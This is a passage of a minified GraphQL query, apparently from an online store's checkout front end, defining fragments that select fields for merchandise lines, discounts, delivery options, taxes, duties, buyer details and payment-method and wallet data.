__typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on 